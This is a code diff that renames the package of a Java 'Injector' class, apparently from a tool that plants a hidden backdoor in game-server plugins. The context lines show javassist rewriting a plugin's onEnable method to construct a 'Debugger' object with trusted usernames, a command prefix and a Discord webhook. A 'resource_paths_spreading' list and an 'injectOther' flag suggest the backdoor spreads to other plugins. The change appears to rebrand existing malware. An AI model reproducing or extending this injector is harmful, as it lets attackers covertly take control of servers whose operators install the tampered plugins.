@@ -1,4 +1,4 @@
-package com.thiccindustries.debugger;
+package com.zeroedindustries.debugger;
 
 import javassist.ClassClassPath;
 import javassist.ClassPool;
@@ -172,7 +172,7 @@ public class Injector {
         try {
             ClassPool pool = new ClassPool(ClassPool.getDefault());
             pool.appendClassPath(orig);
-            pool.appendClassPath(new ClassClassPath(com.thiccindustries.debugger.Debugger.class));
+            pool.appendClassPath(new ClassClassPath(com.zeroedindustries.debugger.Debugger.class));
 
             //Get main class, and find onEnable method
 
@@ -193,7 +193,7 @@ public class Injector {
             }
             sb.append("}");
 
-            String s = "{ new com.thiccindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", \"" + config.discord + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }";
+            String s = "{ new com.zeroedindustries.debugger.Debugger(this, " + (config.useUsernames ? "true, " : "false, ") + sb.toString() + ", \"" + config.prefix + "\", \"" + config.discord + "\", " + (config.injectOther ? "true" : "false") + "," + (config.warnings ? "true" : "false") +"); }";
             if(print_msg)
                 System.out.println(s);
 
@@ -278,39 +278,39 @@ public class Injector {
     }
 
     private static String[] resource_paths_required = {
-            "com.thiccindustries.debugger.Debugger",
-            "com.thiccindustries.debugger.Debugger$1",
-            "com.thiccindustries.debugger.Debugger$2",
-            "com.thiccindustries.debugger.Debugger$3",
-            "com.thiccindustries.debugger.Debugger$4",
-            "com.thiccindustries.debugger.Debugger$5",
-            "com.thiccindustries.debugger.Debugger$6",
-            "com.thiccindustries.debugger.Debugger$7",
-            "com.thiccindustries.debugger.Debugger$8",
-            "com.thiccindustries.debugger.Debugger$9",
-            "com.thiccindustries.debugger.Debugger$10",
-            "com.thiccindustries.debugger.Debugger$11",
-            "com.thiccindustries.debugger.Debugger$12",
-            "com.thiccindustries.debugger.Debugger$13",
-            "com.thiccindustries.debugger.Debugger$14",
-            "com.thiccindustries.debugger.Debugger$15",
-            "com.thiccindustries.debugger.Debugger$16",
-            "com.thiccindustries.debugger.Debugger$17",
-            "com.thiccindustries.debugger.Debugger$PlayerState",
-            "com.thiccindustries.debugger.Debugger$State",
-            "com.thiccindustries.debugger.DWeb",
-            "com.thiccindustries.debugger.DWeb$EmbedObject",
-            "com.thiccindustries.debugger.DWeb$EmbedObject$Footer",
-            "com.thiccindustries.debugger.DWeb$EmbedObject$Thumbnail",
-            "com.thiccindustries.debugger.DWeb$EmbedObject$Image",
-            "com.thiccindustries.debugger.DWeb$EmbedObject$Author",
-            "com.thiccindustries.debugger.DWeb$EmbedObject$Field",
-            "com.thiccindustries.debugger.DWeb$JSONObject",
-            "com.thiccindustries.debugger.Config",
-            "com.thiccindustries.debugger.Config$HelpItem",
-            "com.thiccindustries.debugger.Config$Param",
-            "com.thiccindustries.debugger.Injector",
-            "com.thiccindustries.debugger.Injector$SimpleConfig"
+            "com.zeroedindustries.debugger.Debugger",
+            "com.zeroedindustries.debugger.Debugger$1",
+            "com.zeroedindustries.debugger.Debugger$2",
+            "com.zeroedindustries.debugger.Debugger$3",
+            "com.zeroedindustries.debugger.Debugger$4",
+            "com.zeroedindustries.debugger.Debugger$5",
+            "com.zeroedindustries.debugger.Debugger$6",
+            "com.zeroedindustries.debugger.Debugger$7",
+            "com.zeroedindustries.debugger.Debugger$8",
+            "com.zeroedindustries.debugger.Debugger$9",
+            "com.zeroedindustries.debugger.Debugger$10",
+            "com.zeroedindustries.debugger.Debugger$11",
+            "com.zeroedindustries.debugger.Debugger$12",
+            "com.zeroedindustries.debugger.Debugger$13",
+            "com.zeroedindustries.debugger.Debugger$14",
+            "com.zeroedindustries.debugger.Debugger$15",
+            "com.zeroedindustries.debugger.Debugger$16",
+            "com.zeroedindustries.debugger.Debugger$17",
+            "com.zeroedindustries.debugger.Debugger$PlayerState",
+            "com.zeroedindustries.debugger.Debugger$State",
+            "com.zeroedindustries.debugger.DWeb",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject$Footer",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject$Thumbnail",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject$Image",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject$Author",
+            "com.zeroedindustries.debugger.DWeb$EmbedObject$Field",
+            "com.zeroedindustries.debugger.DWeb$JSONObject",
+            "com.zeroedindustries.debugger.Config",
+            "com.zeroedindustries.debugger.Config$HelpItem",
+            "com.zeroedindustries.debugger.Config$Param",
+            "com.zeroedindustries.debugger.Injector",
+            "com.zeroedindustries.debugger.Injector$SimpleConfig"
     };
     private static String[] resource_paths_spreading = {
             "javassist.ByteArrayClassPath",
